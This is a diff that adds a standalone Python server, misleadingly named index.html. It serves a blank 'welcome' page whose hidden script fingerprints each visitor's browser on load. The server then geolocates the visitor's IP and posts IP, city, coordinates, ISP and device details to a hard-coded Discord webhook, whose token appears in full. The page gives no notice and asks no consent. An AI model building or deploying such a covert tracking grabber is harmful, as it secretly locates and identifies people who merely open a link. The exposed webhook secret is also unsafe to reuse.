@@ -1,0 +1,307 @@
+#!/usr/bin/env python3
+"""
+Single-file site + collector + IP enrichment.
+Run: python index.html
+Requires: Python 3.11+ (stdlib only)
+"""
+
+import json
+import ipaddress
+import urllib.request
+import urllib.error
+import urllib.parse
+from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
+
+WEBHOOK_URL = "https://discord.com/api/webhooks/1569002837193531472/5b7mbQQ7QzvFwSCUmTGAvy9e8fgvRVZxXatVCkmDaPhjCDp8syy3ngWVTsqDPPE3nFI4"
+HOST = "0.0.0.0"
+PORT = 3000
+WEBHOOK_TIMEOUT = 5.0
+IPAPI_TIMEOUT = 3.0
+IPAPI_FIELDS = "status,message,country,countryCode,regionName,city,zip,lat,lon,timezone,isp,org,as,query"
+
+HTML_PAGE = r"""<!DOCTYPE html>
+<html lang="ja">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>site</title>
+</head>
+<body>
+<h1>welcome</h1>
+<script>
+async function getCanvasHash() {
+  try {
+    const c = document.createElement("canvas");
+    const ctx = c.getContext("2d");
+    ctx.textBaseline = "top";
+    ctx.font = "14px Arial";
+    ctx.fillStyle = "#f60";
+    ctx.fillRect(125, 1, 62, 20);
+    ctx.fillStyle = "#069";
+    ctx.fillText("fingerprint-probe", 2, 15);
+    const data = c.toDataURL();
+    let hash = 0;
+    for (let i = 0; i < data.length; i++) {
+      hash = (hash << 5) - hash + data.charCodeAt(i);
+      hash |= 0;
+    }
+    return hash.toString(16);
+  } catch (e) { return null; }
+}
+
+function getWebGLInfo() {
+  try {
+    const c = document.createElement("canvas");
+    const gl = c.getContext("webgl") || c.getContext("experimental-webgl");
+    if (!gl) return null;
+    const dbg = gl.getExtension("WEBGL_debug_renderer_info");
+    return {
+      vendor: gl.getParameter(gl.VENDOR),
+      renderer: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : null
+    };
+  } catch (e) { return null; }
+}
+
+async function collect() {
+  const nav = navigator;
+  const scr = screen;
+  const payload = {
+    userAgent: nav.userAgent,
+    platform: nav.platform,
+    language: nav.language,
+    languages: nav.languages,
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    screen: {
+      width: scr.width,
+      height: scr.height,
+      colorDepth: scr.colorDepth,
+      pixelRatio: window.devicePixelRatio
+    },
+    hardwareConcurrency: nav.hardwareConcurrency,
+    deviceMemory: nav.deviceMemory ?? null,
+    touchSupport: "ontouchstart" in window,
+    canvasHash: await getCanvasHash(),
+    webgl: getWebGLInfo(),
+    cookiesEnabled: nav.cookieEnabled,
+    doNotTrack: nav.doNotTrack,
+    timestamp: new Date().toISOString()
+  };
+  try {
+    await fetch("/api/collect", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload),
+      keepalive: true
+    });
+  } catch (e) {
+    console.warn("collect failed", e);
+  }
+}
+
+window.addEventListener("load", collect);
+</script>
+</body>
+</html>
+"""
+
+
+def resolve_client_ip(handler: BaseHTTPRequestHandler) -> str:
+    forwarded = handler.headers.get("X-Forwarded-For")
+    if forwarded:
+        candidate = forwarded.split(",")[0].strip()
+        try:
+            ipaddress.ip_address(candidate)
+            return candidate
+        except ValueError:
+            pass
+    return handler.client_address[0]
+
+
+def lookup_ip(ip: str) -> dict:
+    if not ip:
+        return {"status": "fail", "message": "no ip"}
+    try:
+        ipaddress.ip_address(ip)
+    except ValueError:
+        return {"status": "fail", "message": "invalid ip"}
+
+    if ip.startswith("127.") or ip == "::1":
+        return {
+            "status": "success",
+            "query": ip,
+            "country": "Local",
+            "countryCode": "LO",
+            "regionName": "Loopback",
+            "city": "localhost",
+            "zip": "",
+            "lat": 0.0,
+            "lon": 0.0,
+            "timezone": "UTC",
+            "isp": "local",
+            "org": "local",
+            "as": "local",
+        }
+
+    params = urllib.parse.urlencode({"fields": IPAPI_FIELDS})
+    url = f"http://ip-api.com/json/{urllib.parse.quote(ip)}?{params}"
+    req = urllib.request.Request(url, headers={"User-Agent": "device-collector/1.0"})
+    try:
+        with urllib.request.urlopen(req, timeout=IPAPI_TIMEOUT) as resp:
+            data = json.loads(resp.read().decode("utf-8"))
+            return data if isinstance(data, dict) else {"status": "fail", "message": "bad shape"}
+    except Exception as e:
+        return {"status": "fail", "message": type(e).__name__}
+
+
+def build_embed(record: dict, geo: dict) -> dict:
+    device = record.get("device", {}) or {}
+    scr = device.get("screen", {}) or {}
+    ua = record.get("userAgentHeader") or "unknown"
+    ip = record.get("ip", "unknown")
+
+    def g(key, default="n/a"):
+        v = geo.get(key)
+        return default if v is None or v == "" else str(v)
+
+    fields = [
+        {"name": "IP", "value": f"`{g('query', ip)}`", "inline": True},
+        {"name": "Country", "value": f"`{g('country')}` ({g('countryCode')})", "inline": True},
+        {"name": "City", "value": f"`{g('city')}` / {g('regionName')}", "inline": True},
+        {"name": "ISP", "value": f"`{g('isp')}`", "inline": True},
+        {"name": "ASN", "value": f"`{g('as')}`", "inline": True},
+        {"name": "Timezone", "value": f"`{g('timezone')}`", "inline": True},
+        {"name": "Zip", "value": f"`{g('zip')}`", "inline": True},
+        {"name": "Coords", "value": f"`{g('lat')}, {g('lon')}`", "inline": True},
+        {"name": "Platform", "value": f"`{device.get('platform', 'n/a')}`", "inline": True},
+        {"name": "Screen", "value": f"`{scr.get('width', '?')}x{scr.get('height', '?')}`", "inline": True},
+        {"name": "Canvas", "value": f"`{device.get('canvasHash', 'null')}`", "inline": True},
+        {"name": "User Agent", "value": f"```{ua[:1000]}```", "inline": False},
+    ]
+
+    if geo.get("status") != "success":
+        fields.insert(0, {"name": "Geo Lookup", "value": f"`{g('message', 'failed')}`", "inline": False})
+
+    return {
+        "title": "Device Record",
+        "color": 0x2ECC71 if geo.get("status") == "success" else 0xE74C3C,
+        "fields": fields,
+    }
+
+
+def send_webhook(record: dict, geo: dict) -> tuple[bool, str]:
+    ip = record.get("ip", "unknown")
+    embed = build_embed(record, geo)
+
+    payload = {
+        "content": f"**collect** — IP: `{ip}`",
+        "embeds": [embed],
+    }
+
+    data = json.dumps(payload, ensure_ascii=False).encode("utf-8")
+    req = urllib.request.Request(
+        WEBHOOK_URL,
+        data=data,
+        headers={
+            "Content-Type": "application/json",
+            "User-Agent": "device-collector/1.0",
+        },
+        method="POST",
+    )
+    try:
+        with urllib.request.urlopen(req, timeout=WEBHOOK_TIMEOUT) as resp:
+            return (200 <= resp.status < 300, f"status={resp.status}")
+    except urllib.error.HTTPError as e:
+        body = ""
+        try:
+            body = e.read().decode("utf-8", errors="replace")[:500]
+        except Exception:
+            pass
+        return (False, f"http_error={e.code} body={body}")
+    except urllib.error.URLError as e:
+        return (False, f"url_error={e.reason}")
+    except Exception as e:
+        return (False, f"error={type(e).__name__}")
+
+
+class Handler(BaseHTTPRequestHandler):
+    server_version = "sitee/1.0"
+
+    def log_message(self, fmt, *args):
+        return
+
+    def _write(self, status: int, body: bytes, content_type: str):
+        self.send_response(status)
+        self.send_header("Content-Type", content_type)
+        self.send_header("Content-Length", str(len(body)))
+        self.send_header("Cache-Control", "no-store")
+        self.end_headers()
+        if self.command != "HEAD":
+            self.wfile.write(body)
+
+    def do_GET(self):
+        if self.path in ("/", "/index.html"):
+            body = HTML_PAGE.encode("utf-8")
+            self._write(200, body, "text/html; charset=utf-8")
+        else:
+            self._write(404, b"not found", "text/plain; charset=utf-8")
+
+    def do_HEAD(self):
+        self.do_GET()
+
+    def do_POST(self):
+        if self.path != "/api/collect":
+            self._write(404, b"not found", "text/plain; charset=utf-8")
+            return
+
+        length_header = self.headers.get("Content-Length", "0")
+        try:
+            length = int(length_header)
+        except ValueError:
+            self._write(400, b"bad length", "text/plain; charset=utf-8")
+            return
+        if length < 0 or length > 32768:
+            self._write(413, b"payload too large", "text/plain; charset=utf-8")
+            return
+
+        raw = self.rfile.read(length) if length else b""
+        try:
+            device = json.loads(raw.decode("utf-8")) if raw else {}
+            if not isinstance(device, dict):
+                raise ValueError("body not object")
+        except (ValueError, UnicodeDecodeError):
+            self._write(400, b"bad json", "text/plain; charset=utf-8")
+            return
+
+        ip = resolve_client_ip(self)
+        geo = lookup_ip(ip)
+
+        record = {
+            "ip": ip,
+            "userAgentHeader": self.headers.get("User-Agent"),
+            "acceptLanguage": self.headers.get("Accept-Language"),
+            "referer": self.headers.get("Referer"),
+            "device": device,
+        }
+
+        ok, detail = send_webhook(record, geo)
+        print(f"[collect] ip={ip} geo={geo.get('status')} webhook={detail}")
+
+        if ok:
+            self._write(204, b"", "text/plain; charset=utf-8")
+        else:
+            self._write(502, b"webhook failed", "text/plain; charset=utf-8")
+
+
+def main():
+    server = ThreadingHTTPServer((HOST, PORT), Handler)
+    print(f"serving on http://{HOST}:{PORT}  (Ctrl+C to stop)")
+    try:
+        server.serve_forever()
+    except KeyboardInterrupt:
+        pass
+    finally:
+        server.server_close()
+
+
+if __name__ == "__main__":
+    main()
